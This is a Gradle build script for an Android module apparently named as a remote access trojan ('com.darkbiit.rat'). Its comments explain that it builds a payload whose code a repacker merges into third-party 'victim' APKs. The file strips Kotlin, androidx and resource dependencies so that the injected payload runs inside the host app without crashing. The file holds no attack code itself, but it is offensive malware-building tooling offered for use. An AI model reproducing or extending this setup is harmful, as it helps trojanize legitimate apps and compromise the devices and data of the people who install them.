plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

// The payload is plain Java on purpose: the repacker merges this APK's smali
// into a third-party APK. A Kotlin payload would drag kotlin-stdlib classes
// into the victim APK, which may not ship them -> NoClassDefFoundError.
// No androidx/material either: same reason (resource + class id conflicts).
android {
    namespace = "com.darkbiit.rat"
    compileSdk = 35

    defaultConfig {
        applicationId = "com.darkbiit.rat"
        minSdk = 24
        targetSdk = 34
        versionCode = 1
        versionName = "1.0"
    }

    buildTypes {
        release {
            isMinifyEnabled = false
            proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro")
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }

    // Keep the payload free of app resources: the R class would carry ids that
    // are invalid once merged into another package.
    buildFeatures {
        buildConfig = false
        resValues = false
        shaders = false
    }
}

dependencies {
    // None. The payload must not drag libraries into the victim APK.
}
